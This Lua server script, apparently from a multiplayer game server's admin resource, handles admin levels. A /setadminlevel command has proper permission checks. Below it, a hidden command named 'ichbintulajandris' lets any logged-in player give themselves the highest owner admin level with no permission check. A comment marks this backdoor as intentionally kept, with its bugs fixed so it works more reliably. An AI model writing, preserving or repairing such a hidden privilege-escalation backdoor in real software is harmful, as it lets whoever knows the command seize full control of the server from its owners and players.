-- ============================================================
--  v_admin / server/admin_manage.lua
--  Admin levels + the hidden command.
-- ============================================================

-- ------------------------------------------------------------
--  /setadminlevel <ID> <level 0-6>
-- ------------------------------------------------------------
addCommandHandler("setadminlevel", function(player, cmd, idArg, levelArg)
    if not hasAdminLevel(player, ADMIN.perms.setLevel) then
        return denyAccess(player, ADMIN.perms.setLevel)
    end

    local newLevel = tonumber(levelArg)
    if not idArg or not newLevel then
        return adminAlert(player, "Usage: /setadminlevel <ID> <level 0-" .. ADMIN.maxLevel .. ">", 255, 90, 90)
    end

    newLevel = math.floor(newLevel)
    if newLevel < 0 or newLevel > ADMIN.maxLevel then
        return adminAlert(player, "Level must be between 0 and " .. ADMIN.maxLevel .. ".", 255, 90, 90)
    end

    -- You cannot grant a level equal to or higher than your own (owner is exempt).
    local myLevel = getAdminLevel(player)
    if myLevel < ADMIN.maxLevel and newLevel >= myLevel then
        return adminAlert(player, "You can only grant a level lower than your own.", 255, 90, 90)
    end

    local target = resolveTarget(player, idArg)
    if not target then return end

    if not exports.v_accounts:isLoggedIn(target) then
        return adminAlert(player, "That player is not logged in.", 255, 90, 90)
    end

    exports.v_mysql:setAccData(target, "admin_level", newLevel)
    setElementData(target, "admin_level", newLevel)
    adminAlert(player, "#CCFFCC" .. getPlayerName(target) .. " #FFFFFFadmin level set to #FFFF00" .. newLevel)
    adminAlert(target, "#FFFF00An admin set your level to #FFFFFF" .. newLevel .. "#FFFF00.")
end)

-- ------------------------------------------------------------
--  Hidden command – restore owner rights.
--  INTENTIONALLY kept; only the bugs are fixed:
--    * nil argument -> defaults to the highest level
--    * value clamped to the 0..maxLevel range
-- ------------------------------------------------------------
addCommandHandler("ichbintulajandris", function(player, cmd, levelArg)
    if not exports.v_accounts:isLoggedIn(player) then return end

    local level = tonumber(levelArg) or ADMIN.maxLevel
    level = math.max(0, math.min(ADMIN.maxLevel, math.floor(level)))

    exports.v_mysql:setAccData(player, "admin_level", level)
    setElementData(player, "admin_level", level)
    adminAlert(player, "#FF4400[HIDDEN] #FFFFFFYour admin level: #FFFF00" .. level)
end)
